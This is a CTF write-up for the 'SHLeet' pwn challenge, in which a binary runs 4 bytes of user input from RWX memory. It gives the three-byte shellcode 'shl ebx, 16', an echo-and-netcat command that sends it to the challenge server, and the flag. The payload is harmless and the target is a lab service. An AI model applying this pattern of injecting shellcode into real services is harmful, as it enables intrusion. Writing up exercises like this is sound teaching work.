---
title: SHLeet – Christmas Register Challenge Writeup
published: 2024-12-24
description: Writeup of the SHLeet pwn challenge involving register manipulation and minimal shellcode.
tags: [CTF, Pwn, Shellcode, BinaryExploitation]
category: Writeups
draft: false
---

## Challenge Description

The challenge provides a vulnerable binary where the EBX register has been modified incorrectly.

```
[Nibbletop] These elves are playing with me again, look at this mess:
ebx = 0x00001337

[Nibbletop] It should be ebx = 0x13370000 instead!
[Nibbletop] Please fix it kind human! SHLeet the registers!
```

**Remote service:**

```
nc 154.57.164.67 30831
```

---

## Initial Analysis

The initial value of EBX is:

```
0x00001337
```

The expected value is:

```
0x13370000
```

This transformation can be achieved by shifting the register left by 16 bits:

```
0x00001337 << 16 = 0x13370000
```

---

## Binary Analysis

The binary is a 64-bit ELF executable:

```bash
file shl33t
```

The main function performs the following actions:

- Initializes EBX with the value `0x1337`
- Allocates RWX memory using `mmap`
- Reads 4 bytes of user input
- Executes the input as shellcode

---

## Vulnerability

The program is vulnerable due to:

- RWX memory allocation
- User-controlled input
- Direct execution without validation

---

## Exploitation Strategy

The required instruction is:

```asm
shl ebx, 16
```

---

## Shellcode

Machine code:

```
C1 E3 10
```

---

## Exploitation

```bash
echo -ne "\xC1\xE3\x10" | nc 154.57.164.67 30831
```

---

## Flag

```
CTF{sh1ft_l3ft_1337_r3g1st3r}
```

---

## Conclusion

A minimal shellcode challenge demonstrating register manipulation under strict size constraints.
